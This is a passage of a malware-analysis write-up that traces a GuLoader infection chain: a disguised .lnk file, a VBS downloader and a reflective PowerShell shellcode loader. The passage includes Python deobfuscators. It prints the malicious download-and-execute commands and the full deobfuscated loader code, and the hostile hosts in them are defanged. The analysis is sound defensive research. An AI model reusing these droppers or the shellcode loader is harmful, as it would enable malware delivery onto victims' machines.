a look at it:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*XdjulL-B8f-MLUI6HIrWYQ.png":{"__typename":"ImageMetadata","id":"1*XdjulL-B8f-MLUI6HIrWYQ.png","originalHeight":965,"originalWidth":1443,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6dcf52d1a5ec_9":{"__typename":"Paragraph","id":"6dcf52d1a5ec_9","name":"d56b","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*XdjulL-B8f-MLUI6HIrWYQ.png"},"text":"Figure 2: Shortcut properties view","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_10":{"__typename":"Paragraph","id":"6dcf52d1a5ec_10","name":"0087","type":"P","href":null,"layout":null,"metadata":null,"text":"As you can see, upon opening the link-files properties, we are greeted with a seemingly empty “Target” field. Normally, we would expect some sort of command here, used to infect the system. But even if we copy the full string from the target field, we only get:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_11":{"__typename":"Paragraph","id":"6dcf52d1a5ec_11","name":"83ca","type":"PRE","href":null,"layout":null,"metadata":null,"text":"\\\\localhost\\c$\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_12":{"__typename":"Paragraph","id":"6dcf52d1a5ec_12","name":"a2af","type":"P","href":null,"layout":null,"metadata":null,"text":"with many space chars appended to hide the command as seen in Figure 2.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_13":{"__typename":"Paragraph","id":"6dcf52d1a5ec_13","name":"0f3f","type":"P","href":null,"layout":null,"metadata":null,"text":"Still, even the fact that the link file seems to open “powershell.exe” as a target is not dangerous in itself. Where is our attack?","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_14":{"__typename":"Paragraph","id":"6dcf52d1a5ec_14","name":"790f","type":"P","href":null,"layout":null,"metadata":null,"text":"Well, things start to change if we look at the .lnk file using a Hex-Editor:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*SKC3IJPdjXNzfXYXp6RfUA.png":{"__typename":"ImageMetadata","id":"1*SKC3IJPdjXNzfXYXp6RfUA.png","originalHeight":1366,"originalWidth":1295,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6dcf52d1a5ec_15":{"__typename":"Paragraph","id":"6dcf52d1a5ec_15","name":"b417","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*SKC3IJPdjXNzfXYXp6RfUA.png"},"text":"Figure 3: .lnk file in Hex-Editor","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_16":{"__typename":"Paragraph","id":"6dcf52d1a5ec_16","name":"ecee","type":"P","href":null,"layout":null,"metadata":null,"text":"As you can see, there is a lot more going on here than was visible at first sight. The full command executed by the .lnk file is actually not only “powershell.exe”, but:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_17":{"__typename":"Paragraph","id":"6dcf52d1a5ec_17","name":"6911","type":"PRE","href":null,"layout":null,"metadata":null,"text":"\u0014\\\\localhost\\c$\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe Invoke-WebRequest hxxps:\u002F\u002Fshorturl[.]at\u002FiwAK9 -O C:\\Users\\Public\\RFQ-INFO.pdf; C:\\Users\\Public\\RFQ-INFO.pdf; Invoke-WebRequest hxxps:\u002F\u002Fshorturl[.]at\u002FguDHW -O C:\\Windows\\Tasks\\Reilon.vbs; C:\\Windows\\Tasks\\Reilon.vbs\u003CC:\\Program Files (x86)\\Microsoft\\Edge\\Appliation\\msedge.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_18":{"__typename":"Paragraph","id":"6dcf52d1a5ec_18","name":"4448","type":"P","href":null,"layout":null,"metadata":null,"text":"Let us split this command up into 2 parts and discuss them individually:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_19":{"__typename":"Paragraph","id":"6dcf52d1a5ec_19","name":"21e8","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Invoke-WebRequest hxxps:\u002F\u002Fshorturl[.]at\u002FiwAK9 -O C:\\Users\\Public\\RFQ-INFO.pdf; C:\\Users\\Public\\RFQ-INFO.pdf;","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_20":{"__typename":"Paragraph","id":"6dcf52d1a5ec_20","name":"d7bb","type":"P","href":null,"layout":null,"metadata":null,"text":"The first PowerShell command executed downloads a file via the shortened URL: hxxps:\u002F\u002Fshorturl[.]at\u002FiwAK9. \nThis actually does a redirect to: hxxps:\u002F\u002Fimg.softmedal[.]com\u002Fuploads\u002F2023-06-23\u002F773918053744.jpg","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_21":{"__typename":"Paragraph","id":"6dcf52d1a5ec_21","name":"90a3","type":"P","href":null,"layout":null,"metadata":null,"text":"Pretending to be a .jpg image file, it is actually a legitimate .pdf file used as a decoy. The file is downloaded to the folder “C:\\Users\\Public\\RFQ-INFO.pdf” and consequently opened via a direct Powershell call.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_22":{"__typename":"Paragraph","id":"6dcf52d1a5ec_22","name":"036c","type":"P","href":null,"layout":null,"metadata":null,"text":"From the users' point of view, it will appear everything is normal. They will look at the following file once executing the .lnk.pdf:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*M1kSxhLk9LpFS1rRAkN1sw.png":{"__typename":"ImageMetadata","id":"1*M1kSxhLk9LpFS1rRAkN1sw.png","originalHeight":1674,"originalWidth":1192,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6dcf52d1a5ec_23":{"__typename":"Paragraph","id":"6dcf52d1a5ec_23","name":"5f8f","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*M1kSxhLk9LpFS1rRAkN1sw.png"},"text":"Figure 4: Decoy document","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_24":{"__typename":"Paragraph","id":"6dcf52d1a5ec_24","name":"6ff2","type":"P","href":null,"layout":null,"metadata":null,"text":"Interestingly enough, when googling for this company, it seems their website is currently compromised and abused for advertisement redirection. Directly opening the page via the URL seems to work fine though. Still, this behavior could hint at a potential compromise of the company's website.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_25":{"__typename":"Paragraph","id":"6dcf52d1a5ec_25","name":"8e4c","type":"P","href":null,"layout":null,"metadata":null,"text":"However, it’s the second part of the PowerShell command that is more interesting:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_26":{"__typename":"Paragraph","id":"6dcf52d1a5ec_26","name":"b997","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Invoke-WebRequest hxxps:\u002F\u002Fshorturl[.]at\u002FguDHW -O C:\\Windows\\Tasks\\Reilon.vbs; C:\\Windows\\Tasks\\Reilon.vbs\u003CC:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_27":{"__typename":"Paragraph","id":"6dcf52d1a5ec_27","name":"707e","type":"P","href":null,"layout":null,"metadata":null,"text":"Upon execution, this command reaches out to hxxps:\u002F\u002Fshorturl[.]at\u002FguDHW which in turn redirects to hxxps:\u002F\u002Fimg.softmedal[.]com\u002Fuploads\u002F2023-06-23\u002F298186187297.jpg. Again, the “.jpg” ending is only used to hide the real file type of this script, potentially slipping through some detection measures. The file is saved as “C:\\Windows\\Tasks\\Reilon.vbs”, revealing its real file type as a Virtual Basic script, and then executed as well.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_28":{"__typename":"Paragraph","id":"6dcf52d1a5ec_28","name":"9b90","type":"H4","href":null,"layout":null,"metadata":null,"text":"Stage 2: Reilon.vbs — Virtual Basic Downloader","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_29":{"__typename":"Paragraph","id":"6dcf52d1a5ec_29","name":"560c","type":"P","href":null,"layout":null,"metadata":null,"text":"After manually downloading the Reilon.vbs file, below is a cropped overview of what we get:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*soBwWhzM9rMH81tjgtQ3aA.png":{"__typename":"ImageMetadata","id":"1*soBwWhzM9rMH81tjgtQ3aA.png","originalHeight":1020,"originalWidth":1445,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6dcf52d1a5ec_30":{"__typename":"Paragraph","id":"6dcf52d1a5ec_30","name":"9b11","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*soBwWhzM9rMH81tjgtQ3aA.png"},"text":"Figure 5: Reilon.vbs","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_31":{"__typename":"Paragraph","id":"6dcf52d1a5ec_31","name":"8340","type":"P","href":null,"layout":null,"metadata":null,"text":"The functionality of this script is pretty straightforward: After defining the Ttheds array, it makes use of an empty loop to postpone execution by 10 seconds. Consequently, a large string is created by joining several sub-strings together. Following that, the initial Ttheds array and a loop are used to create the word “powershell” which is then stored in a variable. In the end, the Shell.Application.ShellExecute command is used to execute the joined string as a PowerShell command. The joined string that gets obfuscated can be seen in Figure 6.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*8H6AHoaTVWHkDwCTbZOyLg.png":{"__typename":"ImageMetadata","id":"1*8H6AHoaTVWHkDwCTbZOyLg.png","originalHeight":576,"originalWidth":3359,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6dcf52d1a5ec_32":{"__typename":"Paragraph","id":"6dcf52d1a5ec_32","name":"758a","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*8H6AHoaTVWHkDwCTbZOyLg.png"},"text":"Figure 6: Gr2 joined string","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_33":{"__typename":"Paragraph","id":"6dcf52d1a5ec_33","name":"1894","type":"P","href":null,"layout":null,"metadata":null,"text":"As can be seen at first glance, the command is obfuscated yet again. When adding in some new lines, we can see that there is a function called Milj379, which is called on every line, with an obfuscated string as an argument. We can therefore safely assume that the function is used to deobfuscate the remaining commands.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*ebIqZSq0HyHsYxHr-o16Gw.png":{"__typename":"ImageMetadata","id":"1*ebIqZSq0HyHsYxHr-o16Gw.png","originalHeight":1228,"originalWidth":3442,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6dcf52d1a5ec_34":{"__typename":"Paragraph","id":"6dcf52d1a5ec_34","name":"0a1e","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*ebIqZSq0HyHsYxHr-o16Gw.png"},"text":"Figure 7: Cleaner View","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_35":{"__typename":"Paragraph","id":"6dcf52d1a5ec_35","name":"0404","type":"P","href":null,"layout":null,"metadata":null,"text":"To make things easier I created a simple Python deobfuscator using this function. It makes use of RegEx to identify each occurrence of the Milj379 function call, then takes the string that needs to be deobfuscated and at the end, it replaces the string with its deobfuscated counterpart.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_36":{"__typename":"Paragraph","id":"6dcf52d1a5ec_36","name":"666e","type":"PRE","href":null,"layout":null,"metadata":null,"text":"import re\n\n# Define the deobfuscation function\ndef Milj379(Endoph):\n    Fald = \"\"\n    for Episper in range(1, len(Endoph) - 1, 2):\n        Ddvgt = Endoph[Episper]\n        Fald += Ddvgt\n    return Fald\n\n# Add code between \"\"\"\ncode = \"\"\"\ncode here\n\"\"\"\n\n\n# Variable to set the name of the deobfuscation function\ndeobfuscation_func_name = \"Milj379\"\n\n# Regular expression pattern to match the deobfuscation function calls\npattern = rf\"{deobfuscation_func_name}\\s*'(.*?)'\"\n\n# Find all occurrences of the deobfuscation function calls\nmatches = re.findall(pattern, code)\n\n# Deobfuscate and replace the calls with deobfuscated strings\nfor match in matches:\n    deobfuscated = globals()[deobfuscation_func_name](match)\n    code = code.replace(f\"{deobfuscation_func_name} '{match}'\", deobfuscated)\n\n# Print the updated code\nprint(code)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"python"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_37":{"__typename":"Paragraph","id":"6dcf52d1a5ec_37","name":"895d","type":"P","href":null,"layout":null,"metadata":null,"text":"Running this script results in the extracted PowerShell command seen below:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_38":{"__typename":"Paragraph","id":"6dcf52d1a5ec_38","name":"05f5","type":"PRE","href":null,"layout":null,"metadata":null,"text":"$Gydep = hxxp:\u002F\u002F194.55.224[.]183\u002Fkng\u002FPersuasive.inf;\n$Stryger = \\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe;\n\n\n.(iex) ($Advertize2=$env:windir) ;\n\n.(iex) ($Stryger=$Advertize2+$Stryger) ;\n\n.(iex) ($Exploit = ((gwmi win32_process -F ProcessId=${PID}).CommandLine) -split [char]34);\n\n.(iex) ($Unlacer = $Exploit[$Exploit.count-2]);\n\n# Check if powershell is 64-bit\n.(iex) ($Modtagn=(Test-Path $Stryger) -And ([IntPtr]::size -eq 8)) ;\n\n# If powershell 64bit -\u003E execute again but in 32bit, else nothing\nif ($Modtagn) {.$Stryger $Unlacer;\n} else {;\n\n# Download payload from above link\n$Fald00=Start-BitsTransfer -Source $Gydep -Destination $Advertize2;\n\n\n.(iex) ($Advertize2=$env:appdata) ;\n.(iex) (Import-Module BitsTransfer) ;\n\n# Save to AppData\\Roaming\\opbrugenda.Dal\n$Advertize2=$Advertize2+'\\opbrugende.Dal';\n\nwhile (-not $Joyf) {.(iex) ($Joyf=(Test-Path $Advertize2)) ;\n.(iex) $Fald00;\n.(iex) (Start-Sleep 5);\n}\n\n# Get downloaded file content\n.(iex) ($Milj37 = Get-Content $Advertize2);\n\n# DeBase64\n.(iex) ($Hamart = [System.Convert]::FromBase64String($Milj37));\n\n# Get ASCII String\n.(iex) ($Fald2 = [System.Text.Encoding]::ASCII.GetString($Hamart));\n\n# Extract \"19271 Byte Payload\" starting at Byte 193539\n.(iex) ($Rawnessa=$Fald2.substring(193539,19271));\n\n# Execute\n.(iex) $Rawnessa;\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_39":{"__typename":"Paragraph","id":"6dcf52d1a5ec_39","name":"2e7b","type":"P","href":null,"layout":null,"metadata":null,"text":"The deobfuscated script gives away its functionality. First of all, it makes sure that the current script is executed using PowerShell 32bit. If not the case, an if condition is used to execute the script another time using the correct architecture. This is likely done to make sure the shellcode downloaded in a later stage is executed under the correct architecture. The script then continues to download a file from the URL: hxxp:\u002F\u002F194.55.224[.]183\u002Fkng\u002FPersuasive.inf . The content of this file is then stored to “$env:appdata\\Roaming\\opbrugenda.Dal”. To get to the next stage, the content of the downloaded file is base64 decoded and interpreted as an ASCII string. Afterward, a certain set of Bytes is extracted from the string and executed via PowerShell. This set of Bytes will be analyzed in the next section.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_40":{"__typename":"Paragraph","id":"6dcf52d1a5ec_40","name":"b34e","type":"H4","href":null,"layout":null,"metadata":null,"text":"Stage 3: Reflective GuLoader shellcode loader","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_41":{"__typename":"Paragraph","id":"6dcf52d1a5ec_41","name":"02b9","type":"P","href":null,"layout":null,"metadata":null,"text":"As with the last section, this code is again obfuscated using its own function. Additionally, to further obfuscate the code, a bunch of comments containing random words were added.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*JqIrxqRwYiLy819BD9nlbA.png":{"__typename":"ImageMetadata","id":"1*JqIrxqRwYiLy819BD9nlbA.png","originalHeight":1777,"originalWidth":3349,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6dcf52d1a5ec_42":{"__typename":"Paragraph","id":"6dcf52d1a5ec_42","name":"7af1","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*JqIrxqRwYiLy819BD9nlbA.png"},"text":"Figure 8: Obfuscated Stage 3","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_43":{"__typename":"Paragraph","id":"6dcf52d1a5ec_43","name":"2ee5","type":"P","href":null,"layout":null,"metadata":null,"text":"So before doing anything else, we can delete all lines starting with “#”. After doing so, we are faced with an obfuscated PowerShell script yet again. This time our deobfuscation function is called “Claro02”.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*d1uJxehdURlJSwkQ_jRcoQ.png":{"__typename":"ImageMetadata","id":"1*d1uJxehdURlJSwkQ_jRcoQ.png","originalHeight":1121,"originalWidth":1966,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6dcf52d1a5ec_44":{"__typename":"Paragraph","id":"6dcf52d1a5ec_44","name":"f3aa","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*d1uJxehdURlJSwkQ_jRcoQ.png"},"text":"Figure 9: Claro02 Deobfuscation function","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_45":{"__typename":"Paragraph","id":"6dcf52d1a5ec_45","name":"e5b9","type":"P","href":null,"layout":null,"metadata":null,"text":"In this case, deobfuscation of the strings is done by taking an obfuscated hexadecimal string, XORing it with 255 (0xFF), and converting the output to ASCII. Again, here is a script that does just this for all strings and does the replacement as well:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_46":{"__typename":"Paragraph","id":"6dcf52d1a5ec_46","name":"26c0","type":"PRE","href":null,"layout":null,"metadata":null,"text":"import re\n\n# Define the deobfuscation function\ndef Claro02(Echino):\n    xor_value = 255\n    Ahantchu = bytearray(len(Echino) \u002F\u002F 2)\n    for loudensres in range(0, len(Echino), 2):\n        Hilse = Echino[loudensres:loudensres+2]\n        Ahantchu[loudensres\u002F\u002F2] = int(Hilse, 16) ^ xor_value\n    return Ahantchu.decode('ascii')\n\n# Sample code\ncode = \"\"\"\ncode here\n\"\"\"\n\n# Variable to set the name of the deobfuscation function\ndeobfuscation_func_name = \"Claro02\"\n\n# Regular expression pattern to match the deobfuscation function calls\npattern = rf\"{deobfuscation_func_name}\\s*'([^']*)'\"\n\n# Find all occurrences of the deobfuscation function calls\nmatches = re.findall(pattern, code)\n\n# Deobfuscate and replace the calls with deobfuscated strings\nfor match in matches:\n    deobfuscated = Claro02(match)\n    code = code.replace(f\"{deobfuscation_func_name} '{match}'\", f\"'{deobfuscated}'\")\n\n# Print the updated code\nprint(code)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"python"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_47":{"__typename":"Paragraph","id":"6dcf52d1a5ec_47","name":"fb31","type":"P","href":null,"layout":null,"metadata":null,"text":"After deobfuscating the script we get the following output:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_48":{"__typename":"Paragraph","id":"6dcf52d1a5ec_48","name":"d155","type":"PRE","href":null,"layout":null,"metadata":null,"text":"# Function Claro05: Retrieves a function pointer for a given function name from a specified module\nfunction Claro05 ($Acce, $Gratierne) {\n    # Get the type of the assembly that contains the functions\n    $Inspi930 = '$tutorenbu = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals(\"System.dll\") }).GetType(\"Microsoft.Win32.UnsafeNativeMethods\")'\n    .('IEX') $Inspi930\n\n    # Get the method info for the delegate for a native function pointer\n    $Inspi935 = '$Falangistu = $tutorenbu.GetMethod(\"GetProcAddress\", [Type[]] @([System.Runtime.InteropServices.HandleRef], [string]))'\n    .('IEX') $Inspi935\n\n    # Invoke the delegate for a native function pointer\n    $Inspi931 = 'return $Falangistu.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($tutorenbu.GetMethod(\"GetModuleHandle\")).Invoke($null, @($Acce)))), $Gratierne))'\n    .('IEX') $Inspi931\n}\n\n# Function Claro04: Defines a dynamic assembly and type for creating delegates\nfunction Claro04 {\n    Param (\n        [Parameter(Position = 0)]\n        [Type[]] $Embraceko,\n        [Parameter(Position = 1)]\n        [Type] $Brands = [Void]\n    )\n    $Inspi932 = '$Typeout = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(\"ReflectedDelegate\")), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(\"InMemoryModule\", $false).DefineType(\"MyDelegateType\", \"Class, Public, Sealed, AnsiClass, AutoClass\", [System.MulticastDelegate])'\n    .('IEX') $Inspi932\n\n    $Inspi933 = '$Typeout.DefineConstructor(\"RTSpecialName, HideBySig, Public\", [System.Reflection.CallingConventions]::Standard, $Embraceko).SetImplementationFlags(\"Runtime, Managed\")'\n    .('IEX') $Inspi933\n\n    $Inspi934 = '$Typeout.DefineMethod(\"Invoke\", \"Public, HideBySig, NewSlot, Virtual\", $Brands, $Embraceko).SetImplementationFlags(\"Runtime, Managed\")'\n    .('IEX') $Inspi934\n\n    $Inspi935 = 'return $Typeout.CreateType()'\n    .('IEX') $Inspi935\n}\n\n# Retrieve the delegate for a native function pointer for the ShowWindow function from USER32\n$Claro01 = '$Efte = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Claro05 \"USER32\" \"ShowWindow\"), (Claro04 @([IntPtr], [UInt32]) ([IntPtr])))'\n.('IEX') $Claro01\n\n# Retrieve the delegate for a native function pointer for the GetConsoleWindow function from kernel32\n$Claro02 = '$Fingalb198 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Claro05 \"kernel32\" \"GetConsoleWindow\"), (Claro04 @([IntPtr]) ([IntPtr])))'\n.('IEX') $Claro02\n\n# Invoke the GetConsoleWindow function pointer to get the window handle\n$Inspi937 = '$Shivunp = $Fingalb198.Invoke(0)'\n.('IEX') $Inspi937\n\n# Invoke the ShowWindow function pointer to show the window\n$Inspi937 = '$Efte.Invoke($Shivunp, 0)'\n.('IEX') $Inspi937\n\n# Retrieve the delegate for a native function pointer for the VirtualAlloc function from kernel32\n$Inspi936 = '$Klausulsai = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Claro05 \"kernel32\" \"VirtualAlloc\"), (Claro04 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))'\n.('IEX') $Inspi936\n\n# Retrieve the delegate for a native function pointer for the NtProtectVirtualMemory function from ntdll\n$Tonnesverb = Claro05 'ntdll' 'NtProtectVirtualMemory'\n\n# Invoke the VirtualAlloc function pointer to allocate memory\n$Inspi937 = '$Industri3 = $Klausulsai.Invoke([IntPtr]::Zero, 645, 0x3000, 0x40)'\n.('IEX') $Inspi937\n\n# Invoke the VirtualAlloc function pointer to allocate memory\n$Inspi938 = '$veristfil = $Klausulsai.Invoke([IntPtr]::Zero, 43073536, 0x3000, 0x4)'\n.('IEX') $Inspi938\n\n# Copy the first shellcode to memory\n$jurym0 = '[System.Runtime.InteropServices.Marshal]::Copy($Hamart, 0,  $Industri3, 645)'\n.('IEX') $jurym0\n\n# Calculate the bytes of the second shellcode \n$Inspi939 = '$Unsyll=193539-645'\n.('IEX') $Inspi939\n\n# Copy the second shellcode to memory\n$jurym1 = '[System.Runtime.InteropServices.Marshal]::Copy($Hamart, 645, $veristfil, $Unsyll)'\n.('IEX') $jurym1\n\n$jurym2 = '$Socialcent = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Claro05 \"USER32\" \"CallWindowProcA\"), (Claro04 @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([IntPtr])))'\n.('IEX') $jurym2\n\n# Execute the first shellcode in $Industri3 with the second shellcode $veristfil as an argument.\n$jurym3 = '$Socialcent.Invoke($Industri3,$veristfil,$Tonnesverb,0,0)'\n.('IEX') $jurym3","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"php"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_49":{"__typename":"Paragraph","id":"6dcf52d1a5ec_49","name":"7a3c","type":"P","href":null,"layout":null,"metadata":null,"text":"I tried to comment on all important parts of the code in order to make it better understandable. A shoutout goes to Drakonia for double-checking. In its essence, it's a reflective shellcode loader to load the GuLoader shellcode. As already documented in other research, the shellcode is split into two parts. A decryptor that gets saved to the variable $Industri3 and the encrypted GuLoader shellcode, which gets stored into the variable $veristfil. Of note is that the shellcodes are both stored in the same file as the shellcode loader, which was initially downloaded in Stage 2. At execution, the script actually makes use of the variable $Hamart from the previous stage, which is the base64 decoded file content of the file stored as “opbrugenda.Dal”. To extract the shellcodes from this file, I wrote another Python script:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":116,"end":124,"href":"https:\u002F\u002Ftwitter.com\u002Fdr4k0nia","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":270,"end":307,"href":"https:\u002F\u002Fwww.esentire.com\u002Fblog\u002Fguloader-vbscript-variant-returns-with-powershell-updates","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_50":{"__typename":"Paragraph","id":"6dcf52d1a5ec_50","name":"4b8d","type":"PRE","href":null,"layout":null,"metadata":null,"text":"import base64\n\n# Read the content of the file\nfilename = \"Path to Persuasive.inf\u002Fopbrugenda.Dal\"\nwith open(filename, 'r') as file:\n    content = file.read()\n\n# Execute ($Milj37 = Get-Content $Advertize2)\nMilj37 = content.strip()\n\n# Convert from Base64\nHamart = base64.b64decode(Milj37)\n\n# Extract $Industri3 and $veristfil\nIndustri3 = Hamart[:645]\nveristfil = Hamart[645:193539]\n\n# Save $Industri3 to a file\nwith open(\"Industri3.bin\", \"wb\") as file1:\n    file1.write(Industri3)\n\n# Save $veristfil to a file\nwith 